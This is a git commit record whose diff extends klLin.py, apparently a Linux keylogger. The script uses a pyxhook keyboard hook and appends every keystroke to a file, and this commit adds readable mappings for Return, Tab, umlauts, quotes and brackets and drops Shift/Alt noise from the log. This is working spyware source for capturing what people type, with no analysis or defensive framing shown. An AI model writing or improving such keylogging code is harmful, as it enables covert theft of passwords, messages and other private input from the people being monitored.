f6c81092cddd60f865ba92ce75fb30a0fe689649
philipp012 <philipp.kiss@bluewin.ch>
2019-11-07 14:08:43 +0100

    added some special characters

--- klLin.py
+++ klLin.py
@@ -13,8 +13,27 @@ def on_key_press(event):
 			f.write('{}'.format(event.Key))
 		elif event.Key == "space":
 			f.write(' ')
+		elif event.Key == "Return":
+			f.write('\n')
+		elif event.Key == "Tab":
+			f.write('[TAB]')
+		elif event.Key == "quotedbl":
+			f.write('"')
+		elif event.Key == "odiaeresis":
+			f.write('ö')
+		elif event.Key == "adiaeresis":
+			f.write('ä')
+		elif event.Key == "udiaeresis":
+			f.write('ü')
+		elif event.Key == "period":
+			f.write('.')
+		elif event.Key == "parentleft":
+			f.write('(')
+		elif event.Key == "parentright":
+			f.write(')')
 		else:
-			f.write('\n{}\n'.format(event.Key))
+			if "Shift" not in event.Key and "Alt" not in event.Key:
+				f.write('\n{}\n'.format(event.Key))
 
 
 new_hook = pyxhook.HookManager()
